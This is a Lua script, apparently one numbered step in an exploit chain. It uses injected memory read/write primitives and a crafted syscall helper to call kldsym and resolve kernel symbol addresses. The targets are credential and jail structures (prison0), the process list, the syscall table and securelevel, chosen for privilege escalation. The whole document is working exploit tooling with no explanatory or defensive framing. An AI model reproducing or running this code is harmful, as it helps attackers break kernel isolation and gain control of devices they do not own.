-- CRASH_CLASS: MODERATE
-- PROBE 43b: kldsym(337) via make_syscall — resolve kernel symbols
--
-- kldsym resolves a kernel symbol by name and returns its address.
-- This is the kernel's dlsym(). If it works, we can look up ANY
-- kernel function or variable by name.
--
-- int kldsym(int fileid, int cmd, void *data)
--   cmd = 1 (KLDSYM_LOOKUP)
--   data = struct kld_sym_lookup {
--     int      version;    // sizeof(struct kld_sym_lookup) = 32
--     char    *symname;    // pointer to symbol name string
--     u_long   symvalue;   // OUTPUT: symbol address
--     size_t   symsize;    // OUTPUT: symbol size
--   }

print("=== PROBE 43b: KLDSYM KERNEL SYMBOL RESOLVE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local sc_getpid = make_syscall(20)
local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("pid: " .. pid)

local KLDSYM_LOOKUP = 1

-- Helper: write a C string to a buffer
local function write_str(buf, str)
    for i = 1, #str do
        memory.write_byte(buf + (i-1), string.byte(str, i))
    end
    memory.write_byte(buf + #str, 0)
end

--------------------------------------------------------------------
-- Try resolving key kernel symbols
--------------------------------------------------------------------
local sc_kldsym = make_syscall(337)

local symbols = {
    "prison0",          -- root jail — credential base
    "allproc",          -- linked list of all processes
    "kernel_pmap",      -- kernel page map
    "copyin",           -- copyin function address
    "copyout",          -- copyout function address
    "rootvnode",        -- root filesystem vnode
    "sysent",           -- syscall table
    "kern_securelevel", -- securelevel variable
    "printf",           -- basic kernel function (good test)
    "bzero",            -- another basic one
}

local name_buf = memory.alloc(128)
-- struct kld_sym_lookup: version(4) + pad(4) + symname(8) + symvalue(8) + symsize(8) = 32
local lookup_buf = memory.alloc(64)

print("")
print("=== KLDSYM LOOKUPS (fileid=1, cmd=KLDSYM_LOOKUP) ===")
for _, sym in ipairs(symbols) do
    -- Zero the struct
    for off = 0, 56, 4 do safe_wd(lookup_buf + off, 0) end

    -- Write version = sizeof(struct kld_sym_lookup) = 32
    safe_wd(lookup_buf, 32)

    -- Write symname pointer at +8
    write_str(name_buf, sym)
    safe_wq(lookup_buf + 8, uint64(name_buf))

    local ok, ret = pcall(function()
        return sc_kldsym(uint64(1), uint64(KLDSYM_LOOKUP), uint64(lookup_buf))
    end)
    local rv = ok and to_num(ret) or -999

    if rv == 0 then
        -- Read symvalue at +16
        local symval = safe_rq(lookup_buf + 16)
        local symsize = safe_rq(lookup_buf + 24)
        local vh, vl = 0, 0
        if symval then vh, vl = get_hi_lo(symval) end
        local sh, sl = 0, 0
        if symsize then sh, sl = get_hi_lo(symsize) end

        local tag = ""
        if vh >= 0xFFFF8000 then
            tag = " *** KERNEL SYMBOL RESOLVED ***"
        end
        print(string.format("  %-20s = %08X_%08X  size=%08X_%08X%s",
            sym, vh, vl, sh, sl, tag))
    else
        print(string.format("  %-20s : ret=%d (failed)", sym, rv))
    end
end

--------------------------------------------------------------------
-- Also try fileid=0 (any module) in case fileid=1 doesn't work
--------------------------------------------------------------------
print("")
print("=== RETRY WITH fileid=0 (any module) ===")
for _, sym in ipairs({"printf", "copyin", "prison0"}) do
    for off = 0, 56, 4 do safe_wd(lookup_buf + off, 0) end
    safe_wd(lookup_buf, 32)
    write_str(name_buf, sym)
    safe_wq(lookup_buf + 8, uint64(name_buf))

    local ok, ret = pcall(function()
        return sc_kldsym(uint64(0), uint64(KLDSYM_LOOKUP), uint64(lookup_buf))
    end)
    local rv = ok and to_num(ret) or -999
    if rv == 0 then
        local symval = safe_rq(lookup_buf + 16)
        if symval then
            local vh, vl = get_hi_lo(symval)
            print(string.format("  %-20s = %08X_%08X", sym, vh, vl))
        end
    else
        print(string.format("  %-20s : ret=%d", sym, rv))
    end
end

print("")
print("=== PROBE 43b COMPLETE ===")
